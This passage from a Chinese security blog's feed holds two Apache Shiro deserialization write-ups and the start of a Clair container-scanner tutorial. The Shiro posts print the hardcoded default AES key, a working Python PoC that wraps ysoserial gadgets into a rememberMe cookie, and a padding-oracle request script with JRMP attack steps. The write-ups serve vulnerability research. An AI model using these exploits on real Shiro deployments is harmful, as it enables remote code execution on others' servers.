self.callback()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self, stdout)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> log_line <span class="keyword">in</span> self._log_line_iter(stdout):</span><br><span class="line">            self.log(log_line)</span><br><span class="line">            <span class="keyword">if</span> len(self.output) &gt; self.log_size:</span><br><span class="line">                <span class="keyword">del</span> self.output[<span class="number">0</span>]</span><br><span class="line">            self.output.append(log_line)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(self, reader)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># fix massive log(memory error)</span></span><br><span class="line">            buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> buf:</span><br><span class="line">                <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">                    lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">                lines[<span class="number">0</span>] = self.lastline + lines[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                    <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">yield</span> line</span><br><span class="line">                self.lastline = lines[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro v1.2.4ååºåˆ—åŒ–</title>
      <link href="/vulnresearch-Shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/vulnresearch-Shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><h2 id="è§¦å‘å…¥å£"><a href="#è§¦å‘å…¥å£" class="headerlink" title="è§¦å‘å…¥å£"></a>è§¦å‘å…¥å£</h2><p>ç™»å½•ç‚¹å‡»è®°ä½å¯†ç æ—¶ï¼Œæœ‰rememberMeï¼Œä¸‹æ¬¡ç™»é™†æ—¶ä¼šå¸¦rememberMeçš„cookieï¼ŒrememberMeå­˜åœ¨ååºåˆ—åŒ–é—®é¢˜</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563415886850.png" alt="1563415886850"></p><h2 id="åºåˆ—åŒ–å…¥å£"><a href="#åºåˆ—åŒ–å…¥å£" class="headerlink" title="åºåˆ—åŒ–å…¥å£"></a>åºåˆ—åŒ–å…¥å£</h2><p>è°ƒè¯•å¾—åˆ°åºåˆ—åŒ–å…¥å£å’Œè§£å¯†æ–¹æ³•ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(AuthenticationToken, AuthenticationInfo):321</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(Subject, PrincipalCollection)</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes(L360:åºåˆ—åŒ–)</span><br><span class="line">    org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(åŠ å¯†æ–¹æ³•)</span><br></pre></td></tr></table></figure><a id="more"></a><p>åœ¨encryptå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°åŠ å¯†æ–¹æ³•ä¸ºAES-CBC</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563420577517.png" alt="1563420577517"> </p><h2 id="è·å–åŠ å¯†key"><a href="#è·å–åŠ å¯†key" class="headerlink" title="è·å–åŠ å¯†key"></a>è·å–åŠ å¯†key</h2><p>AbstractRememberMeManager#encrypt() è°ƒç”¨äº†getEncryptionCipherKey()æ–¹æ³•è·å–åŠ å¯†ç”¨çš„key</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425414839.png" alt="1565425414839"></p><p>getEncryptionCipherKeyè¿”å›äº†encryptionCipherKeyï¼ŒencryptionCipherKeyåœ¨AbstractRememberMeManagerç±»åˆå§‹åŒ–æ—¶è®¾ç½®ï¼š</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425554398.png" alt="1565425554398"></p><p>å‘ä¸Šæ‰¾åˆ°AbstractRememberMeManager#DEFAULT_CIPHER_KEY_BYTESï¼Œå¯†é’¥ç¡¬ç¼–ç åˆ°äº†ä»£ç é‡Œï¼š</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425627351.png" alt="1565425627351"></p><h2 id="åˆ†ærememberMeæ ¼å¼"><a href="#åˆ†ærememberMeæ ¼å¼" class="headerlink" title="åˆ†ærememberMeæ ¼å¼"></a>åˆ†ærememberMeæ ¼å¼</h2><p>ivå’ŒrememberMeäº§ç”Ÿæ¥ç€è°ƒè¯•</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[], byte[], boolean)</span><br></pre></td></tr></table></figure><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563420885798.png" alt="1563420885798"></p><p>å³rememberme=b64(IV+encrypt(serial))</p><p>å› æ­¤æœ‰è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> enc_file, open(<span class="string">"./decrypt.bin"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> dec_file:</span><br><span class="line">    cookie = base64.b64decode(enc_file.read())</span><br><span class="line">    key  = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv=cookie[:<span class="number">16</span>]</span><br><span class="line">    serial=cookie[<span class="number">16</span>:]</span><br><span class="line">    encryptor = AES.new(key, mode, IV=iv)</span><br><span class="line">    remember_bin = encryptor.decrypt(serial)</span><br><span class="line">    dec_file.write(remember_bin)</span><br></pre></td></tr></table></figure><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><p>å› æ­¤æœ‰ååºåˆ—åŒ–ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'CommonsCollections4'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–å…¥å£</p><p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><pre><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals    org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes); <span class="comment">//sink</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> Shiro </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Java </tag>
            
            <tag> æ¼æ´åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro v1.4.0ååºåˆ—åŒ–</title>
      <link href="/vulnresearch-Shrio1.4.0PaddingOracle%E5%AF%BC%E8%87%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/vulnresearch-Shrio1.4.0PaddingOracle%E5%AF%BC%E8%87%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>shiro1.2.5åç§˜é’¥ä¸å†ç¡¬ç¼–ç ï¼Œä½†æ˜¯é‡‡ç”¨CBCåŠ å¯†ä¼šäº§ç”Ÿpadding  oracleæ”»å‡»ï¼Œåˆå› ä¸ºjavaåºåˆ—åŒ–ç»“æ„ä½“åå¯ä»¥åŠ åƒåœ¾å­—ç¬¦ï¼Œæ‰€ä»¥æ”»å‡»èƒ½å¤ŸæˆåŠŸ</p><h1 id="è§£å¯†æ—¶çš„è°ƒç”¨é“¾"><a href="#è§£å¯†æ—¶çš„è°ƒç”¨é“¾" class="headerlink" title="è§£å¯†æ—¶çš„è°ƒç”¨é“¾"></a>è§£å¯†æ—¶çš„è°ƒç”¨é“¾</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals // ä¸è®ºå“ªä¸ªå¼‚å¸¸éƒ½ä¼šè¿”å›nullï¼Œä¸Šå±‚302è·³è½¬</span><br><span class="line">  org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</span><br><span class="line">    org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])</span><br><span class="line">      org.apache.shiro.crypto.JcaCipherService#decrypt(byte[] encrypted, byte[] key, byte[] iv)</span><br><span class="line">        org.apache.shiro.crypto.JcaCipherService#crypt(byte[] encrypted, byte[] key, byte[] iv, int MODE):</span><br><span class="line">          org.apache.shiro.crypto.JcaCipherService#crypt(javax.crypto.Cipher, byte[] encrypted):459 //throw Unable to execute 'doFinal' with cipher instance</span><br><span class="line">            javax.crypto.Cipher#doFinal(byte[] encrypted)  //this=(key+iv+mode) // jce.jaråŒ… è°ƒè¯•ç›´æ¥åœ¨è¿™ä¸‹æ–­ç‚¹</span><br><span class="line">              com.sun.crypto.provider.AESCipher#engineDoFinal(byte[] encrypted, startIdx, len)</span><br><span class="line">                com.sun.crypto.provider.CipherCore#doFinal(byte[] encrypted, startIdx, len)</span><br><span class="line">                  com.sun.crypto.provider.CipherCore#fillOutputBuffer(encrypted, startIdx, iv, startIdx, len, encrypted)</span><br><span class="line">                    com.sun.crypto.provider.CipherCore#unpad(len, decrypted)</span><br><span class="line">                      com.sun.crypto.provider.PKCS5Padding#unpad(decrypted, startIdx, len)  // throw BadPaddingException</span><br><span class="line">  org.apache.shiro.mgt.AbstractRememberMeManager#deserialize(serialized)</span><br><span class="line">    org.apache.shiro.io.DefaultSerializer#deserialize(serialized) // invalid stream header</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="Padding-Oracle-åŸå› "><a href="#Padding-Oracle-åŸå› " class="headerlink" title="Padding  Oracle åŸå› "></a>Padding  Oracle åŸå› </h1><p>ç†è®ºä¸Šå³ä½¿paddingé€šè¿‡ï¼Œååºåˆ—åŒ–ä¹Ÿä¼šå¤±è´¥ï¼Œç»Ÿä¸€æŠ¥é”™å¹¶è¿”å›nullã€‚å› ä¸ºä¸ç®¡æ˜¯Paddingæ­£ç¡®æˆ–æ˜¯é”™è¯¯è¿”å›ç»“æœæ— åŒºåˆ«ï¼Œå› æ­¤æ— æ³•é€ æˆPaddingOracleã€‚</p><p>ä½†æ˜¯æ³¨æ„åˆ°ï¼Œ<strong>è‹¥å½“å­—ç¬¦ä¸²Aå¯ä»¥æˆåŠŸååºåˆ—åŒ–ï¼ŒBä¸ºåƒåœ¾å­—ç¬¦ä¸²ï¼Œåˆ™A+Bå¯ä»¥æˆåŠŸååºåˆ—åŒ–</strong>ï¼ˆè¿™ä¸javaåŸç”Ÿåºåˆ—åŒ–æ•°æ®ç»“æ„æœ‰å…³ï¼‰ï¼Œå› æ­¤å»æ‰SESSIONIDåï¼Œåœ¨æ­£å¸¸çš„rememberMeåé¢æ·»åŠ blockï¼Œå³rememberMe=prefix+iv+secretï¼š</p><p><img src="/vulnresearch-Shrio1.4.0PaddingOracleå¯¼è‡´ååºåˆ—åŒ–/padding.png" alt="padding"></p><p>è¯·æ±‚åï¼š</p><ul><li><p>å¦‚æœBadPaddingException</p><ul><li>è¿”å›é‡æ–°ç™»å½•ï¼ˆsetCookie: DeleteMe=trueï¼‰</li></ul></li><li><p>å¦‚æœPaddingåˆæ³•</p><ul><li>ä¸æ­£å¸¸ç™»å½•è¡¨ç°ä¸€æ ·</li></ul></li></ul><p>å› æ­¤å­˜åœ¨Oracleï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shiro_decode</span><span class="params">(secret: bytearray, iv: bytearray)</span> -&gt; int:</span></span><br><span class="line">    burp0_url = <span class="string">"http://localhost.com:8000/"</span></span><br><span class="line">    <span class="comment">#åˆæ³•çš„rememberMe</span></span><br><span class="line">    prefix = base64.b64decode(<span class="string">"wM0qqzm72M+..."</span>)</span><br><span class="line"></span><br><span class="line">    base64_ciphertext = base64.b64encode(prefix+iv+secret).decode()</span><br><span class="line">    burp0_cookies = &#123;<span class="string">"rememberMe"</span>: base64_ciphertext&#125;</span><br><span class="line">    logging.info(<span class="string">"Sending secret=&#123;&#125;"</span>.format(secret))</span><br><span class="line">    res=requests.get(burp0_url, cookies=burp0_cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    set_cookie=res.headers.get(<span class="string">'set-cookie'</span>,<span class="string">''</span>)</span><br><span class="line">    logging.info(<span class="string">"Headers &#123;&#125;."</span>.format(set_cookie))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'rememberMe'</span> <span class="keyword">in</span> set_cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="JRMPæ”»å‡»æ­¥éª¤"><a href="#JRMPæ”»å‡»æ­¥éª¤" class="headerlink" title="JRMPæ”»å‡»æ­¥éª¤"></a>JRMPæ”»å‡»æ­¥éª¤</h1><ol><li><p>è‡ªå·±æœåŠ¡å™¨èµ·ä¸€ä¸ªJRMPListenerï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections2 <span class="string">'calc'</span></span><br></pre></td></tr></table></figure></li><li><p>ç”¨paddingç”Ÿæˆå¯†æ–‡ï¼Œpadding oracleè„šæœ¬åœ¨<a href="https://github.com/Anemone95/padding-oracle-attack" target="_blank" rel="noopener">https://github.com/Anemone95/padding-oracle-attack</a></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shiro_padding_oracle</span><span class="params">()</span>:</span></span><br><span class="line">    fake_plain=get_deserialized(<span class="string">"127.0.0.1:1234"</span>)</span><br><span class="line">    print(len(fake_plain))</span><br><span class="line">    iv, secret=encrypt(fake_plain, <span class="number">16</span>)</span><br><span class="line">    print(base64.b64encode(iv+secret))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_deserialized</span><span class="params">(host)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>,</span><br><span class="line">                              <span class="string">'-jar'</span>,</span><br><span class="line">                              <span class="string">'ysoserial.jar'</span>,</span><br><span class="line">                              <span class="string">'JRMPClient'</span>,</span><br><span class="line">                              host],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br></pre></td></tr></table></figure></li><li><p>è¿”å›ç»“æœï¼š</p> <figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2019</span>-<span class="number">08</span>-<span class="number">07</span> <span class="number">17</span>:<span class="number">39</span>:<span class="number">10</span>,<span class="number">651</span> : INFO : poc<span class="variable">.py</span> : encrypt : IV: <span class="number">0</span>f154f913ce794ad2c65ce9c0c2bd19e, Secret: d363571634286d600279fdf124069a65695e1c3338da0d27131b6c9362bece8f10796c1163d0c067713a46063ee25313325cb58eedd5cb62be1ed495bd1550974f008df6486bfd0fe24e5a04bd3fb090f036451821303e6b808034e4392c1225bf5a7a5e3eb9fab7b055c809330f83db7a561a2ac4e95f8d16c9bfbe66b35774c16cbb3089e54b63c4d8f86b490dca0f8f1ac46cd4ab2b41645b1909b7fdb4a5c21f15033b6f7dc30b3308ee8f2fb5bf220f38355bbfed92be9431a4127034a967f507f8fc582a00dae5c013263507cb54b08694cba7ef998145147ce8419cc5a665462c2d3b91fb259629d2289e31e9d3c407a02d382df90ac62a7c1b35b08767cbe3541a74987280dff8a541aa20b700000000000000000000000000000000</span><br><span class="line">b'DxVPkTznlK0sZc6cDCvRntNjVxY0KG1gAnn98SQGmmVpXhwzONoNJxMbbJNivs6PEHlsEWPQwGdxOkYGPuJTEzJctY7t1ctivh7Ulb0VUJdPAI32SGv9D+JOWgS9P7CQ8DZFGCEwPmuAgDTkOSwSJb9ael4+ufq3sFXICTMPg9t6VhoqxOlfjRbJv75ms1d0wWy7MInlS2PE2PhrSQ3KD48axGzUqytBZFsZCbf9tKXCHxUDO299wwszCO6PL7W/Ig84NVu/<span class="number">7</span>ZK+lDGkEnA0qWf1B/j8WCoA2uXAEyY1B8tUsIaUy6fvmYFFFHzoQZzFpmVGLC07kfsllinSKJ4x6dPEB6AtOC35CsYqfBs1sIdny+NUGnSYcoDf+KVBqiC3AAAAAAAAAAAAAAAAAAAAAA=='</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> Shiro </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Java </tag>
            
            <tag> æ¼æ´åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clairåˆæ¢</title>
      <link href="/container-Clair%E5%88%9D%E6%8E%A2/"/>
      <url>/container-Clair%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Clairç®€ä»‹"><a href="#Clairç®€ä»‹" class="headerlink" title="Clairç®€ä»‹"></a>Clairç®€ä»‹</h1><p>clairæ˜¯CoreOSå…¬å¸å¼€æºçš„ä¸€å¥—é’ˆå¯¹å®¹å™¨å®‰å…¨æ€§æ£€æµ‹å·¥å…·ï¼Œä¸»è¦ç”¨äºå‘æ˜å®¹å™¨ä¸­ä½¿ç”¨çš„ç»„ä»¶æ˜¯å¦å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ã€‚</p><p>GitHubé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/quay/clair" target="_blank" rel="noopener">https://github.com/quay/clair</a> </p><h1 id="Clair-Framework"><a href="#Clair-Framework" class="headerlink" title="Clair Framework"></a>Clair Framework</h1><h2 id="æœ¯è¯­"><a href="#æœ¯è¯­" class="headerlink" title="æœ¯è¯­"></a>æœ¯è¯­</h2><ul><li>Ancestryâ€”â€”è¡¨ç¤ºå®¹å™¨</li><li>Featureâ€”â€”å®¹å™¨ä¸­ä»»ä½•å…·æœ‰è„†å¼±æ€§çš„å®ä½“ï¼Œå¦‚è½¯ä»¶åŒ…å’Œæ–‡ä»¶</li><li>Feature Namespaceâ€”â€”Featureæ‰€åœ¨çš„ä¸Šä¸‹æ–‡ï¼Œå¦‚æ“ä½œç³»ç»Ÿå’Œç¼–ç¨‹è¯­è¨€</li><li>Vulnerability Sourceâ€”â€”Clairä¸­ç”¨æ¥è·Ÿè¸ªä¸Šæœ‰æ¼æ´æ•°æ®åº“ï¼ˆå¦‚CVEï¼‰çš„ç»„ä»¶</li><li>Vulnerability Metadata Sourceâ€”â€”æ¼æ´å…ƒæ•°æ®ï¼Œç”¨æ¥å…³è”ä¸Šæ¸¸æ¼æ´æ•°æ®å’ŒClairæ•°æ®åº“</li></ul><a id="more"></a><h2 id="Detector"><a href="#Detector" class="headerlink" title="Detector"></a>Detector</h2><ul><li>DataDectorï¼š ç”¨æ¥æ£€æµ‹å®¹å™¨ç±»å‹ï¼ˆé™¤äº†dockerè¿˜æœ‰appcï¼‰</li><li>FeaturesDectorï¼šå‘æ˜å®¹å™¨ä¸­ä½¿ç”¨çš„ç»„ä»¶</li><li>NamespaceDetectorï¼šç”¨æ¥å‘½åç©ºé—´ä¸­å­˜åœ¨çš„å®‰å…¨æ€§é—®é¢˜</li></ul><h2 id="Updaters-amp-Notifiers"><a href="#Updaters-amp-Notifiers" class="headerlink" title="Updaters &amp; Notifiers"></a>Updaters &amp; Notifiers</h2><ul><li>updatersï¼šç”¨æ¥ä»æ¼æ´åº“é‡Œè·å–æ¼æ´ä¿¡æ¯</li><li>Notifierï¼šç”¨æ¥é€šçŸ¥ç”¨æˆ·å®‰å…¨é—®é¢˜ï¼ŒåŒæ—¶æ”¯æŒwebhook</li></ul><h2 id="Datastore"><a href="#Datastore" class="headerlink" title="Datastore"></a>Datastore</h2><p>ä¸»è¦ç”¨æ¥å­˜å‚¨æ¼æ´æ•°æ®</p><h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><h2 id="å®‰è£…ï¼ˆServerï¼‰"><a href="#å®‰è£…ï¼ˆServerï¼‰" class="headerlink" title="å®‰è£…ï¼ˆServerï¼‰"></a>å®‰è£…ï¼ˆServerï¼‰</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir clair_config</span><br><span class="line">curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o <span class="variable">$PWD</span>/clair_config/config.yaml</span><br><span class="line">docker run -d -e POSTGRES_PASSWORD=<span class="string">""</span> -p 5432:5432 postgres:9.6</span><br><span class="line">docker run --net=host -v <span class="variable">$PWD</span>/clair_config:/config quay.io/coreos/clair:latest -config=/config/config.yaml <span class="comment"># é€‰æ‹©ç¨³å®šçš„ç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure><p>éªŒè¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET -I http://<span class="variable">$&#123;docker-host&#125;</span>:6061/health</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: clair</span><br><span class="line">Date: Sat, 16 Nov 2019 12:39:46 GMT</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å¯åŠ¨éœ€è¦åŒæ­¥æ•°æ®åº“ï¼Œå¦‚æœåœ¨å›½å†…éœ€è¦ç­‰å¾…æ›´é•¿æ—¶é—´ï¼Œæ›´æ–°å®Œæ¯•åå¯ä»¥çœ‹åˆ°å¦‚ä¸‹è¾“å‡ºï¼š</p><p><img src="/container-Clairåˆæ¢/image-20191117195355945.png" alt="image-20191117195355945"></p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åˆšåˆšå¯åŠ¨çš„Clairåªæ˜¯ä¸€ä¸ªAPI Serverï¼Œå…·ä½“APIå¯ä»¥å‚è€ƒ <a href="https://app.swaggerhub.com/apis/coreos/clair/3.0" target="_blank" rel="noopener">https://app.swaggerhub.com/apis/coreos/clair/3.0</a> ï¼Œè¦ä½¿ç”¨å®ƒæ‰«æ<strong>æœ¬åœ°å®¹å™¨</strong>å¯ä»¥ä½¿ç”¨<a href="https://github.com/coreos/analyze-local-images" target="_blank" rel="noopener">analyze-local-images</a>ï¼Œç„¶è€ŒClairè®¤ä¸ºæ‰«ææœ¬åœ°å®¹å™¨ä¸æ˜¯å€¼å¾—æå€¡çš„å®è·µï¼Œå› æ­¤è¿™ä¸ªé¡¹ç›®å°±è¢«åºŸå¼ƒæ‰äº†ï¼ˆå…¶åŸç†æ˜¯æœ¬åœ°å¯åŠ¨ä¸€ä¸ªdockerhubæœåŠ¡ï¼Œä½†æ˜¯ç”±äºdockerç‰ˆæœ¬é—®é¢˜å¦‚ä»Šå·²æ— æ³•ä½¿ç”¨ï¼‰ï¼Œä½†æ˜¯ç±»ä¼¼çš„Clientè¿˜æœ‰å¾ˆå¤šï¼Œåœ¨ <a href="https://github.com/quay/clair/blob/master/Documentation/integrations.md" target="_blank" rel="noopener">https://github.com/quay/clair/blob/master/Documentation/integrations.md</a> ä¸Šå¯ä»¥çœ‹åˆ°ï¼Œæ¯”å¦‚<a href="https://github.com/yebinama/paclair" target="_blank" rel="noopener">paclair</a>ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†å…¬æœ‰/ç§æœ‰dockerä»“åº“ä¸­çš„é•œåƒä¸Šä¼ åˆ°clairæ‰«æï¼Œä¸‹é¢å°±ä»¥å®ƒä¸ºä¾‹ï¼Œè¯´æ˜Clairä½¿ç”¨æ–¹æ³•ã€‚</p><p>å®‰è£…paclairå¾ˆç®€å•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paclair</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦åˆ›å»ºpaclairé…ç½®ï¼ˆGitHubä¸Šè¿˜æœ‰å…¶ä»–ä»“åº“çš„é…ç½®ï¼‰ï¼š</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 